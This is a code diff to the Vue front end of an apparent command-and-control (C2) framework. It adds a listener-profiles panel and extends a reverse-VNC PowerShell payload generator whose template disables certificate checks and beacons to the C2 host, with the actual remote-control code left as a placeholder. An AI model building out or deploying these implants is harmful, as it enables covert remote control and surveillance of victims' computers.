@@ -254,6 +254,52 @@
         </div>
       </el-tab-pane>
 
+      <!-- Profiles Panel -->
+      <el-tab-pane label="Profiles" name="profiles">
+        <div class="profiles-panel">
+          <div class="panel-header">
+            <h3>C2 Listener Profiles</h3>
+            <el-button type="primary" size="small" @click="loadProfiles">
+              <el-icon><Refresh /></el-icon>
+              Refresh
+            </el-button>
+          </div>
+          
+          <div v-if="availableProfiles.length === 0" class="empty-state">
+            <el-icon size="64" color="#909399"><Connection /></el-icon>
+            <h3>No Profiles Available</h3>
+            <p>No C2 listener profiles found. Please check:</p>
+            <ul>
+              <li>Backend server is running</li>
+              <li>Profiles are configured in backend/config.json</li>
+              <li>API endpoint /api/profile/list is accessible</li>
+            </ul>
+          </div>
+          
+          <el-table v-else :data="availableProfiles" style="width: 100%" class="profiles-table">
+            <el-table-column prop="name" label="Profile Name" width="200" />
+            <el-table-column prop="host" label="Host" width="120" />
+            <el-table-column prop="port" label="Port" width="80" />
+            <el-table-column prop="useTLS" label="TLS" width="80">
+              <template #default="scope">
+                <el-tag :type="scope.row.useTLS ? 'success' : 'warning'">
+                  {{ scope.row.useTLS ? 'Yes' : 'No' }}
+                </el-tag>
+              </template>
+            </el-table-column>
+            <el-table-column prop="pollInterval" label="Poll Interval" width="120" />
+            <el-table-column prop="isActive" label="Status" width="100">
+              <template #default="scope">
+                <el-tag :type="scope.row.isActive ? 'success' : 'danger'">
+                  {{ scope.row.isActive ? 'Active' : 'Inactive' }}
+                </el-tag>
+              </template>
+            </el-table-column>
+            <el-table-column prop="createdAt" label="Created" width="180" />
+          </el-table>
+        </div>
+      </el-tab-pane>
+
       <!-- VNC Panel - Reverse VNC Payload Generator -->
       <el-tab-pane label="VNC" name="vnc">
         <div class="vnc-panel">
@@ -302,7 +348,7 @@
                   <el-icon><Setting /></el-icon>
                   Generate VNC Payload
                 </el-button>
-                <el-button @click="clearVncForm">
+                <el-button type="warning" @click="clearVncForm">
                   <el-icon><Delete /></el-icon>
                   Clear
                 </el-button>
@@ -341,38 +387,12 @@
                   <el-icon><Download /></el-icon>
                   Download as .ps1
                 </el-button>
-                <el-button type="info" @click="saveVncToHistory">
-                  <el-icon><Star /></el-icon>
-                  Save to History
-                </el-button>
+
               </div>
             </div>
           </div>
           
-          <!-- VNC Payload History -->
-          <div class="vnc-history">
-            <h3>VNC Payload History</h3>
-            <el-table :data="vncHistory" style="width: 100%" class="vnc-history-table">
-              <el-table-column prop="timestamp" label="Generated" width="180" />
-              <el-table-column prop="lhost" label="LHOST" width="120" />
-              <el-table-column prop="lport" label="LPORT" width="80" />
-              <el-table-column prop="payloadType" label="Type" width="120" />
-              <el-table-column prop="useLoader" label="Loader" width="80" />
-              <el-table-column prop="payload" label="Payload" width="300" />
-              <el-table-column label="Actions" width="150">
-                <template #default="scope">
-                  <el-button size="small" @click="loadVncFromHistory(scope.row)">
-                    <el-icon><View /></el-icon>
-                    Load
-                  </el-button>
-                  <el-button size="small" type="danger" @click="deleteVncFromHistory(scope.row)">
-                    <el-icon><Delete /></el-icon>
-                    Delete
-                  </el-button>
-                </template>
-              </el-table-column>
-            </el-table>
-          </div>
+
         </div>
       </el-tab-pane>
     </el-tabs>
@@ -557,17 +577,9 @@ const vncForm = ref({
 const generatingVnc = ref(false)
 const generatedVncPayload = ref('')
 
-interface VncHistoryItem {
-  id: string
-  timestamp: string
-  lhost: string
-  lport: string
-  payloadType: string
-  useLoader: boolean
-  payload: string
-}
 
-const vncHistory = ref<VncHistoryItem[]>([])
+
+
 
 // Agent management
 const agents = ref<any[]>([])
@@ -596,61 +608,30 @@ const loadProfiles = async () => {
     const response = await fetch('/api/profile/list')
     
     if (!response.ok) {
-      console.warn('Profile API not available, using default profiles')
-      // Use default profiles from config
-      availableProfiles.value = [
-        {
-          id: 'default',
-          name: 'Default TLS Profile',
-          host: '0.0.0.0',
-          port: 8443,
-          useTLS: true,
-          pollInterval: 5,
-          isActive: true,
-          createdAt: new Date().toISOString(),
-          updatedAt: new Date().toISOString()
-        }
-      ]
+      console.error('Profile API not available - server returned:', response.status, response.statusText)
+      ElMessage.error(`Failed to load profiles: Server returned ${response.status} ${response.statusText}`)
+      availableProfiles.value = []
       return
     }
     
     const contentType = response.headers.get('content-type')
     if (!contentType || !contentType.includes('application/json')) {
-      console.warn('Profile API returned non-JSON response, using default profiles')
-      availableProfiles.value = [
-        {
-          id: 'default',
-          name: 'Default TLS Profile',
-          host: '0.0.0.0',
-          port: 8443,
-          useTLS: true,
-          pollInterval: 5,
-          isActive: true,
-          createdAt: new Date().toISOString(),
-          updatedAt: new Date().toISOString()
-        }
-      ]
+      console.error('Profile API returned non-JSON response:', contentType)
+      ElMessage.error('Failed to load profiles: Invalid response format from server')
+      availableProfiles.value = []
       return
     }
     
     const data = await response.json()
     availableProfiles.value = data.profiles || []
+    
+    if (availableProfiles.value.length === 0) {
+      ElMessage.warning('No profiles found. Please create profiles in the backend configuration.')
+    }
   } catch (error) {
     console.error('Failed to load profiles:', error)
-    // Use default profiles on error
-    availableProfiles.value = [
-      {
-        id: 'default',
-        name: 'Default TLS Profile',
-        host: '0.0.0.0',
-        port: 8443,
-        useTLS: true,
-        pollInterval: 5,
-        isActive: true,
-        createdAt: new Date().toISOString(),
-        updatedAt: new Date().toISOString()
-      }
-    ]
+    ElMessage.error('Failed to load profiles: Network error or server unavailable')
+    availableProfiles.value = []
   }
 }
 
@@ -878,17 +859,52 @@ const generateVncPayload = async () => {
   generatingVnc.value = true
   
   try {
-    // TODO: Replace with actual PowerShell VNC payload generation
-    // This is a placeholder - you'll provide the actual PowerShell code
-    let payload = `# VNC Payload for ${vncForm.value.lhost}:${vncForm.value.lport}
+    // Get available profiles for TLS configuration
+    const profiles = availableProfiles.value.filter(p => p.isActive && p.useTLS)
+    if (profiles.length === 0) {
+      ElMessage.warning('No active TLS profiles found. VNC payload will use basic connection.')
+    }
+    
+    // Select the first active TLS profile or use default
+    const selectedProfile = profiles[0] || { port: 8443, useTLS: true }
+    
+    let payload = `# Secure VNC Payload for ${vncForm.value.lhost}:${vncForm.value.lport}
+# C2 Profile: ${selectedProfile.name || 'Default TLS Profile'}
+# C2 Port: ${selectedProfile.port}
+# TLS Enabled: ${selectedProfile.useTLS}
 # Type: ${vncForm.value.payloadType}
 # Loader: ${vncForm.value.useLoader ? 'Enabled' : 'Disabled'}
 
-# Your PowerShell VNC code will go here
-# LHOST: ${vncForm.value.lhost}
-# LPORT: ${vncForm.value.lport}
+# Secure TLS Configuration for C2 Communication
+$C2Host = "${vncForm.value.lhost}"
+$C2Port = ${selectedProfile.port}
+$VncHost = "${vncForm.value.lhost}"
+$VncPort = ${vncForm.value.lport}
 
-Write-Host "VNC Payload generated for ${vncForm.value.lhost}:${vncForm.value.lport}"`
+# TLS Certificate Validation (skip for self-signed certs in testing)
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+# Create secure TLS connection to C2
+$C2Uri = "https://${vncForm.value.lhost}:${selectedProfile.port}"
+$C2Headers = @{
+    "Content-Type" = "application/json"
+    "User-Agent" = "MuliC2-VNC-Agent/1.0"
+}
+
+# TODO: Replace with your actual PowerShell VNC code
+# This will connect to the C2 server securely and establish VNC connection
+Write-Host "Connecting to C2 at $C2Uri"
+Write-Host "VNC target: ${vncForm.value.lhost}:${vncForm.value.lport}"
+
+# Your PowerShell VNC implementation will go here
+# It should:
+# 1. Connect to C2 server using TLS
+# 2. Register as a VNC agent
+# 3. Establish VNC connection to target
+# 4. Handle screen capture and control
+
+# Placeholder for VNC functionality
+Write-Host "VNC payload ready for ${vncForm.value.lhost}:${vncForm.value.lport}"`
     
     // Apply loader if enabled
     if (vncForm.value.useLoader) {
@@ -896,7 +912,7 @@ Write-Host "VNC Payload generated for ${vncForm.value.lhost}:${vncForm.value.lpo
     }
     
     generatedVncPayload.value = payload
-    ElMessage.success('VNC payload generated successfully!')
+    ElMessage.success('Secure VNC payload generated successfully!')
   } catch (error) {
     ElMessage.error('Failed to generate VNC payload: ' + error)
   } finally {
@@ -929,9 +945,16 @@ const clearVncForm = () => {
 }
 
 const autoFillVncFromConfig = () => {
-  // Auto-fill from server configuration
-  vncForm.value.lhost = '127.0.0.1' // Default to localhost
-  ElMessage.success('Auto-filled VNC configuration from server settings')
+  // Get the first active TLS profile for C2 configuration
+  const activeProfile = availableProfiles.value.find(p => p.isActive && p.useTLS)
+  
+  if (activeProfile) {
+    vncForm.value.lhost = window.location.hostname || 'localhost'
+    vncForm.value.lport = '5900' // Default VNC port
+    ElMessage.success(`Auto-filled using ${activeProfile.name} (Port: ${activeProfile.port})`)
+  } else {
+    ElMessage.warning('No active TLS profiles found. Please check your C2 configuration.')
+  }
 }
 
 const copyVncPayload = async () => {
@@ -956,44 +979,7 @@ const downloadVncPayload = () => {
   ElMessage.success('VNC payload downloaded')
 }
 
-const saveVncToHistory = () => {
-  const historyItem = {
-    id: Date.now().toString(),
-    timestamp: new Date().toLocaleString(),
-    lhost: vncForm.value.lhost,
-    lport: vncForm.value.lport,
-    payloadType: vncForm.value.payloadType,
-    useLoader: vncForm.value.useLoader,
-    payload: generatedVncPayload.value
-  }
-  
-  vncHistory.value.unshift(historyItem)
-  ElMessage.success('VNC payload saved to history')
-}
 
-const loadVncFromHistory = (item: any) => {
-  vncForm.value.lhost = item.lhost
-  vncForm.value.lport = item.lport
-  vncForm.value.payloadType = item.payloadType
-  vncForm.value.useLoader = item.useLoader
-  generatedVncPayload.value = item.payload
-  ElMessage.success('VNC payload loaded from history')
-}
-
-const deleteVncFromHistory = async (item: any) => {
-  try {
-    await ElMessageBox.confirm(
-      'Delete this VNC payload from history?',
-      'Delete VNC Payload',
-      { confirmButtonText: 'Delete', cancelButtonText: 'Cancel', type: 'warning' }
-    )
-    
-    vncHistory.value = vncHistory.value.filter(h => h.id !== item.id)
-    ElMessage.success('VNC payload deleted from history')
-  } catch {
-    // User cancelled
-  }
-}
 
 
 
@@ -1542,6 +1528,45 @@ const loadDashboardData = async () => {
 
 .agents-panel .agent-history-table {
   margin-top: 15px;
+}
+
+/* Profiles Panel */
+.profiles-panel {
+  padding: 20px;
+}
+
+.profiles-panel .panel-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 20px;
+}
+
+.profiles-panel .panel-header h3 {
+  margin: 0;
+  color: var(--text-white);
+}
+
+.profiles-panel .empty-state {
+  text-align: center;
+  padding: 40px;
+  color: var(--text-gray);
+}
+
+.profiles-panel .empty-state h3 {
+  margin: 20px 0 10px 0;
+  color: var(--text-white);
+}
+
+.profiles-panel .empty-state ul {
+  text-align: left;
+  max-width: 400px;
+  margin: 20px auto;
+  padding-left: 20px;
+}
+
+.profiles-panel .empty-state li {
+  margin: 5px 0;
 }
 
 /* VNC Panel */
